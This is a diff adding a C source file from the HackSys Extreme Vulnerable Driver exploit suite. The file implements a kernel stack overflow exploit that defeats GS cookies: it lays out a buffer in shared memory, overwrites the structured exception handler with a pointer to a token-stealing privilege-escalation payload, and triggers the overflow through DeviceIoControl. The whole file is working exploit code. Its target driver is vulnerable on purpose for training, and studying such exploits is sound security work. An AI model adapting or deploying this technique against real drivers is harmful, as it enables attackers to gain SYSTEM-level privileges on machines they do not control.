@@ -1,0 +1,179 @@
+/*++
+
+          ##     ## ######## ##     ## ########  
+          ##     ## ##       ##     ## ##     ## 
+          ##     ## ##       ##     ## ##     ## 
+          ######### ######   ##     ## ##     ## 
+          ##     ## ##        ##   ##  ##     ## 
+          ##     ## ##         ## ##   ##     ## 
+          ##     ## ########    ###    ########  
+
+        HackSys Extreme Vulnerable Driver Exploit
+
+Author : Ashfaq Ansari
+Contact: ashfaq[at]payatu[dot]com
+Website: http://www.payatu.com/
+
+Copyright (C) 2011-2016 Payatu Technologies Pvt. Ltd. All rights reserved.
+
+This program is free software: you can redistribute it and/or modify it under the terms of
+the GNU General Public License as published by the Free Software Foundation, either version
+3 of the License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with this program.
+If not, see <http://www.gnu.org/licenses/>.
+
+THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
+INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
+TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
+THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+See the file 'LICENSE' for complete copying permission.
+
+Module Name:
+    StackOverflowGS.c
+
+Abstract:
+    This module implements the exploit for Stack Overflow
+    Vulnerability protected by GS cookies implemented in
+    HackSys Extreme Vulnerable Driver.
+
+--*/
+
+#include "StackOverflowGS.h"
+
+DWORD WINAPI StackOverflowGSThread(LPVOID Parameter) {
+    HANDLE hFile = NULL;
+    ULONG BytesReturned;
+    SIZE_T PageSize = 0x1000;
+    HANDLE Sharedmemory = NULL;
+    PVOID MemoryAddress = NULL;
+    PVOID SuitableMemoryForBuffer = NULL;
+    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
+    LPVOID SharedMappedMemoryAddress = NULL;
+    SIZE_T SeHandlerOverwriteOffset = 0x214;
+    PVOID EopPayload = &TokenStealingPayladGSWin7;
+    LPCTSTR SharedMemoryName = (LPCSTR)SHARED_MEMORY_NAME;
+
+    __try {
+        DEBUG_MESSAGE("\t[+] Setting Thread Priority\n");
+
+        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
+            DEBUG_ERROR("\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n");
+        }
+        else {
+            DEBUG_INFO("\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n");
+        }
+
+        // Get the device handle
+        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
+        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);
+
+        hFile = GetDeviceHandle(FileName);
+
+        if (hFile == INVALID_HANDLE_VALUE) {
+            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
+            exit(EXIT_FAILURE);
+        }
+        else {
+            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
+        }
+
+        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");
+
+        DEBUG_INFO("\t\t[+] Creating Shared Memory\n");
+
+        // Create the shared memory
+        Sharedmemory = CreateFileMapping(INVALID_HANDLE_VALUE,
+                                         NULL,
+                                         PAGE_EXECUTE_READWRITE,
+                                         0,
+                                         PageSize,
+                                         SharedMemoryName);
+
+        if (!Sharedmemory) {
+            DEBUG_ERROR("\t\t\t[-] Failed To Create Shared Memory: 0x%X\n", GetLastError());
+            exit(EXIT_FAILURE);
+        }
+        else {
+            DEBUG_INFO("\t\t\t[+] Shared Memory Handle: 0x%p\n", Sharedmemory);
+        }
+
+        DEBUG_INFO("\t\t[+] Mapping Shared Memory To Current Process Space\n");
+
+        // Map the shared memory in the process space of this process
+        SharedMappedMemoryAddress = MapViewOfFile(Sharedmemory,
+                                                  FILE_MAP_ALL_ACCESS,
+                                                  0,
+                                                  0,
+                                                  PageSize);
+
+        if (!SharedMappedMemoryAddress) {
+            DEBUG_ERROR("\t\t\t[-] Failed To Map Shared Memory: 0x%X\n", GetLastError());
+            exit(EXIT_FAILURE);
+        }
+        else {
+            DEBUG_INFO("\t\t\t[+] Mapped Shared Memory: 0x%p\n", SharedMappedMemoryAddress);
+        }
+
+        SuitableMemoryForBuffer = (PVOID)((ULONG)SharedMappedMemoryAddress + (ULONG)(PageSize - SeHandlerOverwriteOffset));
+
+        DEBUG_INFO("\t\t[+] Suitable Memory For Buffer: 0x%p\n", SuitableMemoryForBuffer);
+
+        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");
+
+        RtlFillMemory(SharedMappedMemoryAddress, PageSize, 0x41);
+
+        MemoryAddress = (PVOID)((ULONG)SuitableMemoryForBuffer + 0x204);
+        *(PULONG)MemoryAddress = 0x42424242;            // overwrite xor'ed cookie
+
+        DEBUG_INFO("\t\t\t[+] XOR'ed GS Cookie Value: 0x%p\n", *(PULONG)MemoryAddress);
+        DEBUG_INFO("\t\t\t[+] XOR'ed GS Cookie Address: 0x%p\n", MemoryAddress);
+
+        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
+        *(PULONG)MemoryAddress = 0x43434343;            // junk
+
+        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
+        *(PULONG)MemoryAddress = 0x44444444;            // Next SE handler
+
+        DEBUG_INFO("\t\t\t[+] Next SE Handler Value: 0x%p\n", *(PULONG)MemoryAddress);
+        DEBUG_INFO("\t\t\t[+] Next SE Handler Address: 0x%p\n", MemoryAddress);
+
+        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
+        *(PULONG)MemoryAddress = (ULONG)EopPayload;     // SE Handler
+
+        DEBUG_INFO("\t\t\t[+] SE Handler Value: 0x%p\n", *(PULONG)MemoryAddress);
+        DEBUG_INFO("\t\t\t[+] SE Handler Address: 0x%p\n", MemoryAddress);
+
+        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);
+
+        DEBUG_MESSAGE("\t[+] Triggering Kernel Stack Overflow GS\n");
+
+        OutputDebugString("****************Kernel Mode****************\n");
+
+        DeviceIoControl(hFile,
+                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS,
+                        (LPVOID)SuitableMemoryForBuffer,
+                        (DWORD)SeHandlerOverwriteOffset + RAISE_EXCEPTION_IN_KERNEL_MODE,
+                        NULL,
+                        0,
+                        &BytesReturned,
+                        NULL);
+
+        OutputDebugString("****************Kernel Mode****************\n");
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    return EXIT_SUCCESS;
+}
